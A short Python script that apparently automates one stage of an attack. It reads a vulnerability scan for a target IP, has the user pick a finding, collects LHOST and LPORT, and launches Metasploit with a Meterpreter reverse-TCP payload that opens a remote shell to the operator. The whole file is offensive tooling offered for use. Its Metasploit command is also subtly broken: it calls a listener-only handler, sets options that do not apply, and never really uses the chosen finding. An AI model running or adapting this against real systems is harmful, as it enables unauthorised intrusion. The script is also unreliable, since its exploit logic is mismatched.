import sys
import subprocess
import re

# Get the target IP address, exploit tool, and output directory from the main script
TARGET_IP = sys.argv[1]
EXPLOIT_TOOL = sys.argv[2]
OUTPUT_DIR = sys.argv[3]

# Define the vulnerability scan output file
VULNERABILITY_SCAN_OUTPUT = f"{OUTPUT_DIR}/vulnerability_scan.txt"

# Read the vulnerability scan results
with open(VULNERABILITY_SCAN_OUTPUT, 'r') as file:
    vulnerability_scan_results = file.read()

# Extract the found vulnerabilities from the scan results
vulnerabilities = re.findall(r'Found vulnerability: (.*)', vulnerability_scan_results)

# Print the found vulnerabilities
print("Found vulnerabilities:")
for vulnerability in vulnerabilities:
    print(f"- {vulnerability}")

# Prompt the user to select a vulnerability to exploit
selected_vulnerability = input("Enter the number of the vulnerability to exploit (1-{}): ".format(len(vulnerabilities)))

# Check if the selected vulnerability is valid
if not selected_vulnerability.isdigit() or int(selected_vulnerability) < 1 or int(selected_vulnerability) > len(vulnerabilities):
    print("Error: Invalid vulnerability selection.")
    sys.exit(1)

# Get the selected vulnerability details
selected_vulnerability_details = vulnerabilities[int(selected_vulnerability) - 1]

# Prompt for required options
lhost = input("Enter the LHOST value: ")
lport = input("Enter the LPORT value: ")

# Run the exploit using Metasploit
subprocess.run([EXPLOIT_TOOL, "-x", f"use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set TARGET_IP {TARGET_IP}; set VULNERABILITY {selected_vulnerability_details}; exploit; exit"], check=True)

print("Exploit completed.")
